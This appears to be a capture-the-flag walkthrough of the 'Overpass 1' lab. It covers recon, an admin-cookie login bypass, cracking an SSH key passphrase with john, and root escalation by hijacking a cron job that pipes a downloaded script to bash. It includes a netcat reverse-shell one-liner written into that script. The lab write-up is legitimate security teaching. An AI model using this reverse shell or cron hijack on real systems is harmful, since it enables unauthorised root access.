# Overpass 1 - [Room]
Well lets start for getting the machine ip, and do some start recon:
- 10.10.194.125

## Recon 
lets start with the nmap:

`nmap -sCV -vv -A 10.10.194.125`

if you wanna letput to a file do 

`nmap -sCV -vv -A 10.10.194.125 -o nmap.log`

Nmap Output:
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see two services: 
**SSH**: port 22, OpenSSH 7.6p1
**HTTP**: port 80, Golang net/http server

So lets use gobuster to see some directories on the webpage:

`gobuster -w path/to/wordlist -u 10.10.194.125`

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.194.125/
[+] Threads      : 10
[+] Wordlist     : /path/to/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/02/11 14:32:17 Starting gobuster
=====================================================
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
=====================================================
2023/02/11 14:34:48 Finished
=====================================================
```
here we can see some good pages, but lets focus on the admin, its the more important here

## Gaining Access

Lets go to http://10.10.194.125/admin
we see a login panel, lets try some default credentials:
![image](https://user-images.githubusercontent.com/80606587/218267157-f919bfd6-fd66-48e6-9f80-f69634990954.png)

And as we see, doesnt work (admin:admin, admin:password, admin:passwd, admin:admin123, admin:password123)
lets give a look into the source code

![image](https://user-images.githubusercontent.com/80606587/218267207-ef194ee0-1b0e-4599-9b72-934e0c32c650.png)

lets go into "login.js"..

![image](https://user-images.githubusercontent.com/80606587/218267235-550ab11d-a881-4ca9-9d41-896b1829dd77.png)

Damn, we found a nice thing here.

Lets try go over here

![image](https://user-images.githubusercontent.com/80606587/218267541-9b55c343-4933-4b8d-9fb0-8b1bf156550e.png)

And add cookies to this:

![image](https://user-images.githubusercontent.com/80606587/218267643-b015b059-9b53-4ed7-8d23-3fbb73ac8d75.png)

Sooo, lets refresh now..
And as we can see, we in
![image](https://user-images.githubusercontent.com/80606587/218267791-cafb0ab5-ed10-46cd-aaad-900ecbb86ea2.png)

Ok, now with this Private Key we can try something

\\ I just wanna alert, that ip change here because of some reason the machine crashed to me 💀, but steps doesnt change nothing chill

We got a private key, and we get the name james, sooo

![image](https://user-images.githubusercontent.com/80606587/218268163-c73fa2c1-88a0-4c0d-9f79-a0901a96b4d7.png)

As we can see we need passphrase for the key too, soooo, lets use ssh2john

`python3 ssh2john.py id_rsa > hash `
we will get this in the hash file
(I dont show the total hash for obvious reasons)
```
id_rsa:$sshng$1$16$9F85D92F34F4262
6F13A7493AB48F337$1200$2cdbb9c1004
[REDECTED]1cfba4a67771ce135a5c4852
15db9ac895f9ea05cd4b6e8edca6bfc53b
```

So now lets run: `john hash_file --wordlist=rockyou.txt`

![image](https://user-images.githubusercontent.com/80606587/218269637-18ccc544-3146-4ce7-8969-9469f1541165.png)

![image](https://user-images.githubusercontent.com/80606587/218269808-12d150d1-649f-4328-9297-7dfa96d8f6bc.png)

So lets log in SSH with the credentials


and nice, lets play here, lets first grab the flag with 

`cat user.txt`

now lets seek for privesc

I dropped linpeas in the machine, via python3 -m http.server

and we get somethings from .
we discover that we can edit /etc/hosts config sooo

![image](https://user-images.githubusercontent.com/80606587/218269959-e2057b7d-c82d-4bc2-8b6c-9268b148359e.png)

looking too /etc/crontab
we know
```
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
that he is searching for updates all thet time, so lets make this
```
mkdir downloads && cd downloads && mkdir src && echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f" > src/buildscript.sh

cd ..
```

now lets run sudo python3 -m http.server 80
and we will get a root bash in our nc listener that we setted up on port 4242
